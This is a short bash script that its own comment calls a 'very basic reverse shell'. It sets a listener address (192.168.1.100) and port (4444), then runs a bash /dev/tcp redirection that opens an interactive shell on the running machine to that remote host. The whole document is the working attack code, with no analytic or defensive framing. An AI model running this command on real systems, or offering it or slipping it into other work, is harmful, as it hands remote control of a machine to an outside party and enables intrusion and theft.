#!/bin/bash
# very basic reverse shell script with bash
# 
LHOST="192.168.1.100"  # IP
LPORT="4444"           # PORT

# Reverse shell command
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
